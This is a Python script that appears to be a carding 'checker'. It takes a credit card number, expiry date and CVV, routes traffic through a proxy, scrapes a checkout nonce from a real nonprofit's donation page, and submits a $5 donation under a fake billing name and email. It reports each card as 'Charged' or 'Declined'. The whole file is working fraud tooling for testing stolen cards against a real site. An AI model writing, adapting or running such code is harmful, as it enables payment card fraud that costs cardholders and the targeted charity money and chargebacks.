import ssl
from aiohttp import ClientSession

async def au(cc, mes, ano, cvv, proxy: dict):
    async with ClientSession() as session:
        ssl_context = ssl.create_default_context()
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-PE;q=0.4',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document', 
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        }

        async with session.get('https://www.ccof.org/foundation/donate/', headers=headers, proxy=proxy, ssl=ssl_context) as r1:
            resp = await r1.text()
            nonce = find_between(resp, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"')
            print(f"NONCE: {nonce}")
            security = resp.split('"security": "')[1].split('"')[0]
            print(f"SECURITY: {security}")
        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-PE;q=0.4',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ0MTg5NTIiLCJhcCI6IjE1ODg5NDIxMDkiLCJpZCI6IjZlOGVhYmM5MmE0OTU4NDciLCJ0ciI6IjdmMjVkZWEzNjhlMzUwZTQyMjA5ZDJlY2I0NDIyNjZlIiwidGkiOjE3MjQzODUwMTY1NTMsInRrIjoiNjY2ODYifX0=',
            'origin': 'https://www.ccof.org',
            'priority': 'u=1, i',
            'referer': 'https://www.ccof.org/foundation/donate/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-7f25dea368e350e42209d2ecb442266e-6e8eabc92a495847-01',
            'tracestate': '66686@nr=0-1-4418952-1588942109-6e8eabc92a495847----1724385016553',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            'x-newrelic-id': 'UAIGWV9WChABUVJXAAUOUFYF',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wcdp_ajax_donation_calculation',
            'security': '4f42f1c002',
            'postid': '44103',
            'donation-amount': '5',
            'wcdp-donation-amount': '5',
            'quantity': '1',
        }

        async with session.post('https://www.ccof.org/wp/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxy, ssl=ssl_context) as r2:
            await r2.text()

        params = {
            'wc-ajax': 'update_order_review',
        }

        data = {
            'security': '4f42f1c002',
            'payment_method': 'authorizeaim_multiaccount',
            'country': 'US',
            'state': 'CA',
            'postcode': '94520',
            'city': 'Concord',
            'address': '1961 Market St',
            'address_2': '',
            's_country': 'US',
            's_state': 'CA',
            's_postcode': '94520',
            's_city': 'Concord',
            's_address': '1961 Market St',
            's_address_2': '',
            'has_full_address': 'true',
            'post_data': f'billing_first_name=Juan&billing_last_name=carlos&billing_company=&billing_country=US&billing_address_1=1961%20Market%20St&billing_address_2=&billing_city=Concord&billing_state=CA&billing_postcode=94520&billing_phone=9256856464&billing_email=dwdawdas%40gmail.com&order_comments=&payment_method=authorizeaim_multiaccount&authorizeaim_multiaccount-card-number=&authorizeaim_multiaccount-card-expiry=&authorizeaim_multiaccount-card-cvc=&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
        }

        async with session.post('https://www.ccof.org/', params=params, headers=headers, data=data, proxy=proxy, ssl=ssl_context) as r3:
            await r3.text()

        headers['accept'] = 'application/json, text/javascript, */*; q=0.01'

        data = {
            'billing_first_name': 'Juan',
            'billing_last_name': 'carlos',
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': '1961 Market St',
            'billing_address_2': '',
            'billing_city': 'Concord',
            'billing_state': 'CA',
            'billing_postcode': '94520',
            'billing_phone': '9256856464',
            'billing_email': 'dwdawdas@gmail.com',
            'order_comments': '',
            'payment_method': 'authorizeaim_multiaccount',
            'authorizeaim_multiaccount-card-number': f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
            'authorizeaim_multiaccount-card-expiry': f'{mes} / {ano}',
            'authorizeaim_multiaccount-card-cvc': cvv,
            'woocommerce-process-checkout-nonce': nonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
        }

        params = {
            'wc-ajax': 'checkout',
        }

        async with session.post('https://www.ccof.org/', params=params, headers=headers, data=data, proxy=proxy, ssl=ssl_context) as r4:
            error = await r4.text()
            if 'success' in error:
                print("CHARGED 5$") 
                status = "Charged 5$✅"
                msg = error
            else:
                print(error)
                status = "Declined ❌"
                msg = error

            print(error)

        return msg, status

def find_between(data: str, first: str, last: str):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None